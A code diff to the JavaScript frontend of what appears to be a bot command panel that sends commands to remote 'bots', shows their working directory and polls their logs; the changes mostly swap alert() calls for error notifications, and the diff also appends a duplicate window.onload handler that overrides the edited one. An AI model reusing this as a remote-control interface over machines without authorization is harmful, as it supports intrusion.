@@ -23,6 +23,7 @@ async function fetchCWD() {
     const cwdDisplay = document.getElementById("cwd-display");
     const botId = document.getElementById("client-id").value;
     if (!botId) {
+        showNotification(`Not bot selected.`, 'error');
         cwdDisplay.textContent = "No bot selected $";
         return;
     }
@@ -33,10 +34,12 @@ async function fetchCWD() {
             const data = await response.json();
             cwdDisplay.textContent = `${data.cwd} $`;
         } else {
+            showNotification(`Failed to get current directory : ${response.status} - ${response.statusText}.`, 'error');
             console.error("Failed to fetch CWD");
             cwdDisplay.textContent = "Error retrieving CWD $";
         }
     } catch (error) {
+        showNotification(`Could not get current directory ${error}.`, 'error');
         console.error("Error fetching CWD:", error);
         cwdDisplay.textContent = "Error retrieving CWD $";
     }
@@ -55,7 +58,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         const botId = document.getElementById("client-id").value;
         if (!botId) {
-            alert("Please enter a Bot ID first.");
+            showNotification('Please enter a bot ID.', 'error');
             return;
         }
 
@@ -92,9 +95,11 @@ document.addEventListener("DOMContentLoaded", () => {
                 // Refresh the CWD
                 await fetchCWD();
             } else {
+                showNotification('Failed to send command.', 'error');
                 console.error("Failed to send command");
             }
         } catch (error) {
+            showNotification(`Error sending command ${error}.`, 'error');
             console.error("Error sending command:", error);
         }
     }
@@ -143,9 +148,11 @@ async function fetchBotLogs(botId, prepend = false, isRefresh = false) {
             }
         } else {
             const error = await response.json();
+            showNotification(`Error getting logs : ${error.error}.`, 'error');
             fileContentElement.textContent = `Error: ${error.error}`;
         }
     } catch (err) {
+        showNotification(`Failed to fetch bot logs : ${err.message}.`, 'error');
         fileContentElement.textContent = `Error: Failed to fetch bot logs. ${err.message}`;
     }
 }
@@ -183,7 +190,7 @@ function setBotId(botId) {
 }
 
 // On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
-window.onload = () => {
+window.onload = async () => {
     const botId = getQueryParam('id');
     if (botId) {
         setBotId(botId); // Populate the hidden input field with the bot ID
@@ -193,6 +200,7 @@ window.onload = () => {
         startTimer(botId); // Start the timer for regular updates
         fetchCWD(); // Fetch the current working directory
     } else {
+        showNotification('No bot ID was provided', 'error');
         document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
         document.getElementById('cwd-display').textContent = 'No bot selected $';
     }
@@ -208,7 +216,7 @@ document.getElementById('load-client').addEventListener('click', () => {
         fetchBotLogs(clientId); // Get file data
         startTimer(clientId); // Auto-update file content
     } else {
-        alert('Please enter a valid Client ID.');
+        showNotification('Please enter a valid Client ID.', 'error');
     }
 });
 
@@ -224,7 +232,7 @@ function forcerefresh() {
         fetchBotLogs(botId, false, true); // Refresh the most recent lines
         countdown = 30; // Reset the countdown
     } else {
-        alert('Please enter a valid Bot ID.');
+        showNotification('Please enter a valid Bot ID.', 'error');
     }
 }
 
@@ -238,6 +246,22 @@ document.getElementById('load-more').addEventListener('click', async () => {
         await new Promise(r => setTimeout(r, 1)); // For some reason, we need to wait for just a little (1ms)
         forcerefresh(); // Allows to reset the line numbers :)
     } else {
-        alert('Please enter a valid Bot ID.');
+        showNotification('Please enter a valid Bot ID.', 'error');
     }
 });
+
+// On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
+window.onload = () => {
+    const botId = getQueryParam('id');
+    if (botId) {
+        setBotId(botId); // Populate the hidden input field with the bot ID
+        offset = 0; // Reset offset for "Load More"
+        refreshOffset = 0; // Reset offset for refresh
+        fetchBotLogs(botId); // Fetch the logs for the specified bot ID
+        startTimer(botId); // Start the timer for regular updates
+        fetchCWD(); // Fetch the current working directory
+    } else {
+        document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
+        document.getElementById('cwd-display').textContent = 'No bot selected $';
+    }
+};
